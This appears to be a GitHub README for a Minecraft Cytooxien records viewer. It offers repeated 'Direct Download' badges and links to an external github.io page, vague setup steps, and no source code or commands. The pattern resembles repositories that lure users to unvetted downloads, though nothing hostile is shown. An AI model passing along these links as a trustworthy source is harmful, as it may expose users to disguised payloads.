# MCP-Records v1.0 - Game Script Utility 2026

> **Web viewer for Minecraft Cytooxien records.** Inspect scoreboard data, review player statistics, and work with a responsive interface for sorting, filtering, and export.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/henry-davisvw8789/mcp-records-utility?style=flat-square)](https://github.com/henry-davisvw8789/mcp-records-utility)

---

<p align="center">
  <a href="https://henry-davisvw8789.github.io/mcp-records-utility/">
    <img src="https://img.shields.io/badge/Download-MCP-Records%20Script-brightgreen?style=for-the-badge" alt="Download MCP-Records Script">
  </a>
</p>

> **[Direct Download - MCP-Records](https://henry-davisvw8789.github.io/mcp-records-utility/)**

---

[Download Latest Build](https://henry-davisvw8789.github.io/mcp-records-utility/)

---

## About

MCP-Records is a browser-based records viewer built for Minecraft Cytooxien party minigame statistics. It turns raw scoreboard output into an interactive display, making it easier to sort results, narrow them with filters, and inspect leaderboard-style information without manually scanning through records.

The app pairs a responsive web UI with Python-driven processing and analysis. Its layout is meant to stay flexible across different screens while still supporting live avatar retrieval, real-time refreshes, and CSV export for offline review or additional analysis.

---

## Features

- Interactive records table with sorting and filtering
- Live avatar retrieval for player entries
- Adjustable layout and sorting behavior
- Real-time updates for current scoreboard data
- CSV export for external analysis or archiving
- Responsive interface for desktop and smaller screens
- Python-based data analysis layer
- Built specifically for Minecraft Cytooxien records and player stats

---

## Setup

1. Download the latest build from the project page.
2. Place the files in your preferred local folder, or deploy them with your web hosting setup.
3. Start the web app using the provided entry point or backend instructions from the repository.
4. Open the UI in a browser and connect it to the available scoreboard data source.

Example launch flow:

- Frontend: open the web interface in your browser
- Backend: run the Python service if your build includes one
- Data: verify the tabulator API or records source is reachable

If you use a custom environment, keep the frontend assets and Python backend paths aligned with the repository layout.

---

## Options

| Setting | Purpose | Notes |
| --- | --- | --- |
| Layout mode | Adjusts how the records table is displayed | Useful for different screen sizes |
| Sort field | Chooses the active stat column | Can be changed from the UI |
| Filter input | Narrows visible player rows | Supports quick searches |
| Avatar loading | Enables live player image fetching | Depends on the available player data source |
| CSV export | Saves the current view as a file | Handy for offline review |
| Auto refresh | Updates displayed data in place | Use when live stats are available |

Minimal config example:

    layout: responsive
    sort: score
    export: csv
    avatars: enabled
    refresh: on

---

## Compatibility

MCP-Records is intended for web use and is centered on Minecraft Cytooxien scoreboard records. It works best in modern browsers with JavaScript enabled and access to the required data source or tabulator API.

Known limitations can depend on the environment used to host it, the availability of player metadata, and whether the backend data feed is reachable. If avatar or stat lookups are unavailable, the table can still display the records that are present locally.

---

## FAQ

**How do I get started?**  
Download the build, open the web interface, and connect it to the scoreboard data source required by your setup.

**Can I adjust the table layout?**  
Yes. The interface supports configurable layouts and sorting so you can match the view to your workflow.

**Does it refresh while I am viewing data?**  
Yes, it can update in real time when the configured source provides fresh records.

**Can I export the results?**  
Yes. CSV export is included for saving the current dataset or the filtered view.

**What if avatar images are missing?**  
Check that the player data source is reachable and that avatar fetching is enabled in your environment.

**Where should the files be placed?**  
That depends on how you install or host the project. If your setup uses both frontend and Python backend components, keep their paths aligned with the repository layout.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
